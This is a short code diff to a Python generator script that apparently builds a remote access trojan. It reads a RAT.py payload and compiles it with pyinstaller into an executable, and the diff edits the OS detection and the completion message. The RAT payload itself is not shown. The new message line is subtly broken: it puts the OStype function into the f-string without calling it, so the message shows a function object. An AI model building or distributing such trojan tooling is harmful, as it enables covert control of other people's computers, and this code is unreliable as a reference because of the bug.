@@ -12,7 +12,7 @@ def rgb(r, g, b):
     return "\033[38;2;{};{};{}m".format(r, g, b)
 def main(mode):
     clear()
-    if 'windows' in OStype():
+    if 'windows' in OStype().lower():
         code =open(f'{__file__.replace("generator.py","")}RATS\\RAT.py','r')
     else :
         code =open(f'{__file__.replace("generator.py","")}RATS/RAT.py','r')
@@ -96,6 +96,6 @@ while 1:
         system(f"pyinstaller --onefile pyRAT.pyw")
         clear()
         chdir(currPath)
-        input(f"{rgb(0,255,0)}[ * ] Done (The executable file for windows is located in the /dist path)! \n\nEnter to continue : {Fore.RESET}")
+        input(f"{rgb(0,255,0)}[ * ] Done (The executable file for {OStype} is located in the /dist path)! \n\nEnter to continue : {Fore.RESET}")
     elif selection=='2':
         return 1
